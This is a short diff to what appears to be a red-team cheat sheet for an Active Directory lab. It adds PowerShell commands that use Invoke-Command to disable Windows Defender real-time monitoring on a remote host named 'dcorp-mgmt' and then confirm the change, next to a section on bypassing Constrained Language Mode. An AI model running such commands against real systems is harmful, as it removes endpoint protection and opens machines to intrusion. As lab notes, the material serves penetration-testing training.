@@ -2654,6 +2654,10 @@ Invoke-Command -Scriptblock{whoami;hostname} -computername dcorp-mgmt
 Set-MpPreference -DisableRealtimeMonitoring $true -Verbose
 Get-MpPreference | findstr /I realtime
 ```
+```
+Invoke-Command -Scriptblock{Set-MpPreference -DisableRealtimeMonitoring $true -Verbose} -computername dcorp-mgmt
+Invoke-Command -Scriptblock{Get-MpPreference| findstr /I realtime} -computername dcorp-mgmt
+```
 ##### POWERSHELL - BYPASS CLM CONSTRAINED LANGUAGE MODE
 ```
 $ExecutionContext.SessionState.LanguageMode
